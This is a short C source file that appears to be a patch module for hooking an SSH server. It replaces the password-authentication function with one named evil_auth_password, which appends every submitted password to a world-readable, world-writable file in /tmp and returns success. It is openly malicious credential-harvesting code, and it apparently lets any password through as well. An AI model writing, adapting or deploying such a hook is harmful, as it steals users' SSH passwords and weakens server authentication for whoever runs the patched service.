#include "patch.h"
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

static const char path[] = "/tmp/passwords.txt";

ssize_t write_all(int fd, const char *buffer){
	ssize_t ret, total = 0;
	size_t buflen = strlen(buffer);

	while(total < buflen) {
		ret = write(fd, buffer + total, buflen - total);
		if (ret == -1) {
			total = -1;
			break;
		}
		total += ret;
	}
	return total;
}

int evil_auth_password(void *ssh, const char *password){
	int fd;
	ssize_t written;
	char endline = '\n';

	fd = open(path, O_CREAT | O_WRONLY | O_APPEND, S_IROTH | S_IWOTH);
	if(fd == -1)
		return 0;
	written = write_all(fd, password);
	if(written == -1)
		return 0;
	write(fd, &endline, sizeof(char));

	if(close(fd) == -1)
		return 0;
	return 1;
}

PATCH(
	PATCH_OWN_SHORT(auth_password, evil_auth_password)
)
